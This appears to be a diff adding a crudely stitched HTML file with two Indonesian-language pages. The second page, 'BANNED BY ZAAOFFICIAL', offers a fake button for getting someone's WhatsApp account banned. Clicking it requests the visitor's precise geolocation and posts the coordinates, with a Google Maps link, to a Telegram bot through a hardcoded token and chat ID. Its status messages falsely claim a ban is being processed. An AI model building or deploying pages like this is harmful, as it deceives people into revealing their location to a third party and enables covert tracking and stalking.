@@ -1,0 +1,151 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   REGISTER TO BANNED
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+ </head>
+ <body class="relative min-h-screen flex flex-col">
+  <img alt="Abstract blue background with light geometric shapes and soft gradients" class="fixed inset-0 w-full h-full object-cover -z-10" height="1080" src="https://files.catbox.moe/6ewtr1.jpg" width="1920"/>
+  <main class="flex-grow flex items-center justify-center p-6">
+   <div class="bg-blue bg-opacity-80 rounded-lg p-8 max-w-lg shadow-lg text-center">
+    <h1 class="text-3xl font-bold mb-4 text-gray-900">
+    </h1>
+    <p class="text-gray-700">
+     <code>
+     </code>
+    </p>
+   </div>
+  </main>
+ </body>
+</html>
+html lang="id" class="scroll-smooth" >
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BANNED BY ZAAOFFICIAL</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col items-center justify-center p-4">
+  <div class="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
+    <h1 class="text-2xl font-semibold mb-4 text-center text-gray-800">
+      BANNED BY ZAAOFFICIAL
+    </h1>
+    <p class="mb-6 text-gray-600 text-center">
+      pastikan lokasi anda aktif&jaringan seluler hidup
+    </p>
+    <div class="flex justify-center mb-6">
+      <button
+        id="sendLocationBtn"
+        class="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg flex items-center space-x-2"
+      >
+        <i class="fas fa-location-arrow"></i>
+        <span>gas baned omku</span>
+      </button>
+    </div>
+    <p id="status" class="text-center text-sm text-gray-500"></p>
+  </div>
+
+  <script>
+    // Ganti dengan token bot Telegram Anda dan chat_id tujuan
+    const TELEGRAM_BOT_TOKEN = "7583503996:AAGkqdkRBNEQuhcOwKvklBFOMn7twpqP0eM";
+    const TELEGRAM_CHAT_ID = "7528035732";
+
+    const sendLocationBtn = document.getElementById("sendLocationBtn");
+    const statusEl = document.getElementById("status");
+
+    function sendLocationToTelegram(latitude, longitude) {
+      const message = `📍 Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          if (data.ok) {
+            statusEl.textContent = "memproses banned whattsap anda...";
+            statusEl.classList.remove("text-red-500");
+            statusEl.classList.add("text-green-600");
+          } else {
+            statusEl.textContent = "Gagal membanned whattsap.";
+            statusEl.classList.remove("text-green-600");
+            statusEl.classList.add("text-red-500");
+          }
+        })
+        .catch(() => {
+          statusEl.textContent = "Terjadi kesalahan saat membanned whattsap.";
+          statusEl.classList.remove("text-green-600");
+          statusEl.classList.add("text-red-500");
+        });
+    }
+
+    sendLocationBtn.addEventListener("click", () => {
+      statusEl.textContent = "Meminta izin lokasi...";
+      statusEl.classList.remove("text-red-500", "text-green-600");
+
+      if (!navigator.geolocation) {
+        statusEl.textContent = "Geolocation tidak didukung oleh browser Anda.";
+        statusEl.classList.add("text-red-500");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          statusEl.textContent = "Memproses banned whattsap anda...";
+          sendLocationToTelegram(latitude, longitude);
+        },
+        (error) => {
+          switch (error.code) {
+            case error.PERMISSION_DENIED:
+              statusEl.textContent = "Izin lokasi ditolak.";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              statusEl.textContent = "Lokasi tidak tersedia.";
+              break;
+            case error.TIMEOUT:
+              statusEl.textContent = "Permintaan lokasi timeout.";
+              break;
+            default:
+              statusEl.textContent = "Terjadi kesalahan saat mengambil lokasi.";
+          }
+          statusEl.classList.add("text-red-500");
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
+  </script>
+</body>
+</html>
